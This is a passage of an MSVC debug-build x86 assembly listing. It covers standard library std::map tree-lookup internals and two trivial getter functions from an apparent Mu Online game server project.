; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xstddef
;	COMDAT ??$addressof@$$CBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@ABV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@$$CBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@ABV10@@Z PROC ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > const >, COMDAT

; 274  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 275  :     return __builtin_addressof(_Val);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 276  : }

  0000c	5f		 pop	 edi
  0000d	5e		 pop	 esi
  0000e	5b		 pop	 ebx
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$addressof@$$CBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@ABV10@@Z ENDP ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > const >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??$_Lower_bound_duplicate@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE_NQAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z
_TEXT	SEGMENT
tv78 = -72						; size = 4
_this$ = -4						; size = 4
__Bound$ = 8						; size = 4
__Keyval$ = 12						; size = 4
??$_Lower_bound_duplicate@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE_NQAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Lower_bound_duplicate<unsigned long>, COMDAT
; _this$ = ecx

; 1694 :     bool _Lower_bound_duplicate(const _Nodeptr _Bound, const _Keyty& _Keyval) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1695 :         return !_Bound->_Isnil && !_DEBUG_LT_PRED(_Getcomp(), _Keyval, _Traits::_Kfn(_Bound->_Myval));

  0000c	8b 45 08	 mov	 eax, DWORD PTR __Bound$[ebp]
  0000f	0f be 48 0d	 movsx	 ecx, BYTE PTR [eax+13]
  00013	85 c9		 test	 ecx, ecx
  00015	75 33		 jne	 SHORT $LN3@Lower_boun
  00017	8b 55 08	 mov	 edx, DWORD PTR __Bound$[ebp]
  0001a	83 c2 10	 add	 edx, 16			; 00000010H
  0001d	52		 push	 edx
  0001e	e8 00 00 00 00	 call	 ??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z ; std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0>::_Kfn<unsigned long const ,unsigned long>
  00023	83 c4 04	 add	 esp, 4
  00026	50		 push	 eax
  00027	8b 45 0c	 mov	 eax, DWORD PTR __Keyval$[ebp]
  0002a	50		 push	 eax
  0002b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002e	e8 00 00 00 00	 call	 ?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Getcomp
  00033	8b c8		 mov	 ecx, eax
  00035	e8 00 00 00 00	 call	 ??R?$less@K@std@@QBE_NABK0@Z ; std::less<unsigned long>::operator()
  0003a	0f b6 c8	 movzx	 ecx, al
  0003d	85 c9		 test	 ecx, ecx
  0003f	75 09		 jne	 SHORT $LN3@Lower_boun
  00041	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv78[ebp], 1
  00048	eb 07		 jmp	 SHORT $LN4@Lower_boun
$LN3@Lower_boun:
  0004a	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv78[ebp], 0
$LN4@Lower_boun:
  00051	8a 45 b8	 mov	 al, BYTE PTR tv78[ebp]

; 1696 :     }

  00054	5f		 pop	 edi
  00055	5e		 pop	 esi
  00056	5b		 pop	 ebx
  00057	8b e5		 mov	 esp, ebp
  00059	5d		 pop	 ebp
  0005a	c2 08 00	 ret	 8
??$_Lower_bound_duplicate@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE_NQAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Lower_bound_duplicate<unsigned long>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??$_Find_lower_bound@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE?AU?$_Tree_find_result@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@1@ABK@Z
_TEXT	SEGMENT
__Trynode$ = -24					; size = 4
__Result$ = -20						; size = 12
__Scary$ = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Keyval$ = 12						; size = 4
??$_Find_lower_bound@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE?AU?$_Tree_find_result@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@1@ABK@Z PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find_lower_bound<unsigned long>, COMDAT
; _this$ = ecx

; 1699 :     _Tree_find_result<_Nodeptr> _Find_lower_bound(const _Keyty& _Keyval) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 58	 sub	 esp, 88			; 00000058H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1700 :         const auto _Scary = _Get_scary();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
  00014	89 45 f8	 mov	 DWORD PTR __Scary$[ebp], eax

; 1701 :         _Tree_find_result<_Nodeptr> _Result{{_Scary->_Myhead->_Parent, _Tree_child::_Right}, _Scary->_Myhead};

  00017	8b 45 f8	 mov	 eax, DWORD PTR __Scary$[ebp]
  0001a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0001c	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  0001f	89 55 ec	 mov	 DWORD PTR __Result$[ebp], edx
  00022	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR __Result$[ebp+4], 0
  00029	8b 45 f8	 mov	 eax, DWORD PTR __Scary$[ebp]
  0002c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0002e	89 4d f4	 mov	 DWORD PTR __Result$[ebp+8], ecx

; 1702 :         _Nodeptr _Trynode = _Result._Location._Parent;

  00031	8b 45 ec	 mov	 eax, DWORD PTR __Result$[ebp]
  00034	89 45 e8	 mov	 DWORD PTR __Trynode$[ebp], eax
$LN2@Find_lower:

; 1703 :         while (!_Trynode->_Isnil) {

  00037	8b 45 e8	 mov	 eax, DWORD PTR __Trynode$[ebp]
  0003a	0f be 48 0d	 movsx	 ecx, BYTE PTR [eax+13]
  0003e	85 c9		 test	 ecx, ecx
  00040	75 59		 jne	 SHORT $LN3@Find_lower

; 1704 :             _Result._Location._Parent = _Trynode;

  00042	8b 45 e8	 mov	 eax, DWORD PTR __Trynode$[ebp]
  00045	89 45 ec	 mov	 DWORD PTR __Result$[ebp], eax

; 1705 :             if (_DEBUG_LT_PRED(_Getcomp(), _Traits::_Kfn(_Trynode->_Myval), _Keyval)) {

  00048	8b 45 0c	 mov	 eax, DWORD PTR __Keyval$[ebp]
  0004b	50		 push	 eax
  0004c	8b 4d e8	 mov	 ecx, DWORD PTR __Trynode$[ebp]
  0004f	83 c1 10	 add	 ecx, 16			; 00000010H
  00052	51		 push	 ecx
  00053	e8 00 00 00 00	 call	 ??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z ; std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0>::_Kfn<unsigned long const ,unsigned long>
  00058	83 c4 04	 add	 esp, 4
  0005b	50		 push	 eax
  0005c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0005f	e8 00 00 00 00	 call	 ?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Getcomp
  00064	8b c8		 mov	 ecx, eax
  00066	e8 00 00 00 00	 call	 ??R?$less@K@std@@QBE_NABK0@Z ; std::less<unsigned long>::operator()
  0006b	0f b6 d0	 movzx	 edx, al
  0006e	85 d2		 test	 edx, edx
  00070	74 12		 je	 SHORT $LN4@Find_lower

; 1706 :                 _Result._Location._Child = _Tree_child::_Right;

  00072	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR __Result$[ebp+4], 0

; 1707 :                 _Trynode                 = _Trynode->_Right;

  00079	8b 45 e8	 mov	 eax, DWORD PTR __Trynode$[ebp]
  0007c	8b 48 08	 mov	 ecx, DWORD PTR [eax+8]
  0007f	89 4d e8	 mov	 DWORD PTR __Trynode$[ebp], ecx

; 1708 :             } else {

  00082	eb 15		 jmp	 SHORT $LN5@Find_lower
$LN4@Find_lower:

; 1709 :                 _Result._Location._Child = _Tree_child::_Left;

  00084	c7 45 f0 01 00
	00 00		 mov	 DWORD PTR __Result$[ebp+4], 1

; 1710 :                 _Result._Bound           = _Trynode;

  0008b	8b 45 e8	 mov	 eax, DWORD PTR __Trynode$[ebp]
  0008e	89 45 f4	 mov	 DWORD PTR __Result$[ebp+8], eax

; 1711 :                 _Trynode                 = _Trynode->_Left;

  00091	8b 45 e8	 mov	 eax, DWORD PTR __Trynode$[ebp]
  00094	8b 08		 mov	 ecx, DWORD PTR [eax]
  00096	89 4d e8	 mov	 DWORD PTR __Trynode$[ebp], ecx
$LN5@Find_lower:

; 1712 :             }
; 1713 :         }

  00099	eb 9c		 jmp	 SHORT $LN2@Find_lower
$LN3@Find_lower:

; 1714 : 
; 1715 :         return _Result;

  0009b	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  0009e	8b 4d ec	 mov	 ecx, DWORD PTR __Result$[ebp]
  000a1	89 08		 mov	 DWORD PTR [eax], ecx
  000a3	8b 55 f0	 mov	 edx, DWORD PTR __Result$[ebp+4]
  000a6	89 50 04	 mov	 DWORD PTR [eax+4], edx
  000a9	8b 4d f4	 mov	 ecx, DWORD PTR __Result$[ebp+8]
  000ac	89 48 08	 mov	 DWORD PTR [eax+8], ecx
  000af	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1716 :     }

  000b2	5f		 pop	 edi
  000b3	5e		 pop	 esi
  000b4	5b		 pop	 ebx
  000b5	8b e5		 mov	 esp, ebp
  000b7	5d		 pop	 ebp
  000b8	c2 08 00	 ret	 8
??$_Find_lower_bound@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE?AU?$_Tree_find_result@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@1@ABK@Z ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find_lower_bound<unsigned long>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xstddef
;	COMDAT ??$addressof@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@AAV10@@Z PROC ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >, COMDAT

; 274  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 275  :     return __builtin_addressof(_Val);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 276  : }

  0000c	5f		 pop	 edi
  0000d	5e		 pop	 esi
  0000e	5b		 pop	 ebx
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$addressof@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@AAV10@@Z ENDP ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xstddef
;	COMDAT ??$addressof@U?$pair@$$CBKK@std@@@std@@YAPAU?$pair@$$CBKK@0@AAU10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@U?$pair@$$CBKK@std@@@std@@YAPAU?$pair@$$CBKK@0@AAU10@@Z PROC ; std::addressof<std::pair<unsigned long const ,unsigned long> >, COMDAT

; 274  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 275  :     return __builtin_addressof(_Val);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 276  : }

  0000c	5f		 pop	 edi
  0000d	5e		 pop	 esi
  0000e	5b		 pop	 ebx
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$addressof@U?$pair@$$CBKK@std@@@std@@YAPAU?$pair@$$CBKK@0@AAU10@@Z ENDP ; std::addressof<std::pair<unsigned long const ,unsigned long> >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??$_Find@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@ABEPAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z
_TEXT	SEGMENT
__Loc$ = -16						; size = 12
_this$ = -4						; size = 4
__Keyval$ = 8						; size = 4
??$_Find@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@ABEPAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find<unsigned long>, COMDAT
; _this$ = ecx

; 1457 :     _NODISCARD _Nodeptr _Find(const _Other& _Keyval) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1458 :         const _Tree_find_result<_Nodeptr> _Loc = _Find_lower_bound(_Keyval);

  0000c	8b 45 08	 mov	 eax, DWORD PTR __Keyval$[ebp]
  0000f	50		 push	 eax
  00010	8d 4d f0	 lea	 ecx, DWORD PTR __Loc$[ebp]
  00013	51		 push	 ecx
  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ??$_Find_lower_bound@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE?AU?$_Tree_find_result@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find_lower_bound<unsigned long>

; 1459 :         if (_Lower_bound_duplicate(_Loc._Bound, _Keyval)) {

  0001c	8b 45 08	 mov	 eax, DWORD PTR __Keyval$[ebp]
  0001f	50		 push	 eax
  00020	8b 4d f8	 mov	 ecx, DWORD PTR __Loc$[ebp+8]
  00023	51		 push	 ecx
  00024	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00027	e8 00 00 00 00	 call	 ??$_Lower_bound_duplicate@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE_NQAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Lower_bound_duplicate<unsigned long>
  0002c	0f b6 d0	 movzx	 edx, al
  0002f	85 d2		 test	 edx, edx
  00031	74 05		 je	 SHORT $LN2@Find

; 1460 :             return _Loc._Bound;

  00033	8b 45 f8	 mov	 eax, DWORD PTR __Loc$[ebp+8]
  00036	eb 0a		 jmp	 SHORT $LN1@Find
$LN2@Find:

; 1461 :         }
; 1462 : 
; 1463 :         return _Get_scary()->_Myhead;

  00038	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003b	e8 00 00 00 00	 call	 ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
  00040	8b 00		 mov	 eax, DWORD PTR [eax]
$LN1@Find:

; 1464 :     }

  00042	5f		 pop	 edi
  00043	5e		 pop	 esi
  00044	5b		 pop	 ebx
  00045	8b e5		 mov	 esp, ebp
  00047	5d		 pop	 ebp
  00048	c2 04 00	 ret	 4
??$_Find@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@ABEPAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find<unsigned long>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xutility
;	COMDAT ?pointer_to@?$pointer_traits@PAU?$pair@$$CBKK@std@@@std@@SAPAU?$pair@$$CBKK@2@AAU32@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
?pointer_to@?$pointer_traits@PAU?$pair@$$CBKK@std@@@std@@SAPAU?$pair@$$CBKK@2@AAU32@@Z PROC ; std::pointer_traits<std::pair<unsigned long const ,unsigned long> *>::pointer_to, COMDAT

; 146  :     _NODISCARD static _CONSTEXPR20 pointer pointer_to(_Reftype _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 147  :         return _STD addressof(_Val);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ??$addressof@U?$pair@$$CBKK@std@@@std@@YAPAU?$pair@$$CBKK@0@AAU10@@Z ; std::addressof<std::pair<unsigned long const ,unsigned long> >
  00012	83 c4 04	 add	 esp, 4

; 148  :     }

  00015	5f		 pop	 edi
  00016	5e		 pop	 esi
  00017	5b		 pop	 ebx
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
?pointer_to@?$pointer_traits@PAU?$pair@$$CBKK@std@@@std@@SAPAU?$pair@$$CBKK@2@AAU32@@Z ENDP ; std::pointer_traits<std::pair<unsigned long const ,unsigned long> *>::pointer_to
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\TerrainManager.h
;	COMDAT ?Size@CTerrainManager@@QAE?BHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?Size@CTerrainManager@@QAE?BHXZ PROC			; CTerrainManager::Size, COMDAT
; _this$ = ecx

; 22   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 23   : 		return m_iSize;

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 40 08	 mov	 eax, DWORD PTR [eax+8]

; 24   : 	}

  00012	5f		 pop	 edi
  00013	5e		 pop	 esi
  00014	5b		 pop	 ebx
  00015	8b e5		 mov	 esp, ebp
  00017	5d		 pop	 ebp
  00018	c3		 ret	 0
?Size@CTerrainManager@@QAE?BHXZ ENDP			; CTerrainManager::Size
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\ResetSystem.h
;	COMDAT ?GetResetCmdAuthority@CResetSystem@@QAEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?GetResetCmdAuthority@CResetSystem@@QAEHXZ PROC		; CResetSystem::GetResetCmdAuthority, COMDAT
; _this$ = ecx

; 152  : 	BOOL GetResetCmdAuthority(){return this->m_bUseResetCommand;}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 40 28	 mov	 eax, DWORD PTR [eax+40]
  00012	5f		 pop	 edi
  00013	5e		 pop	 esi
  00014	5b		 pop	 ebx
  00015	8b e5		 mov	 esp, ebp
  00017	5d		 pop	 ebp
  00018	c3		 ret	 0
?GetResetCmdAuthority@CResetSystem@@QAEHXZ ENDP		; CResetSystem::GetResetCmdAuthority
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
;	COMDAT ??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___param0$ = 8						; size = 4
___param1$ = 12						; size = 4
??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z PROC ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 0c	 mov	 eax, DWORD PTR ___param1$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d 08	 mov	 ecx, DWORD PTR ___param0$[ebp]
  00013	51		 push	 ecx
  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ??0?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	5f		 pop	 edi
  00020	5e		 pop	 esi
  00021	5b		 pop	 ebx
  00022	8b e5		 mov	 esp, ebp
  00024	5d		 pop	 ebp
  00025	c2 08 00	 ret	 8
??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ENDP ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??C?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEPAU?$pair@$$CBKK@1@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??C?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEPAU?$pair@$$CBKK@1@XZ PROC ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator->, COMDAT
; _this$ = ecx

; 276  :     _NODISCARD pointer operator->() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
